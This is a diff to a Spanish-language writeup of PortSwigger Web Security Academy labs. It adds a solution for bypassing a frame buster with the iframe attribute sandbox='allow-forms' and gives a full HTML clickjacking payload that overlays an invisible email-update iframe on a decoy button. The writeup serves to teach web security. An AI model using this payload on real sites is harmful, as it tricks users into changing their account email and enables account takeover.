@@ -454,6 +454,32 @@ Para resolver este laboratorio, después de autenticarse con las credenciales pr
 <iframe src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"></iframe>
 ```
 
+### [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)
+
+Este laboratorio está protegido por un frame buster que evita que se ejecute un frame en el sitio web. El objetivo es evitar el frame buster y realizar un ataque clickjacking que ejecute un Update Email.
+
+La solución a este laboratorio es la misma que el anterior, pero agregando el atributo sandbox="allow-forms" en el tag del iframe.
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:510px;
+        left: 80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
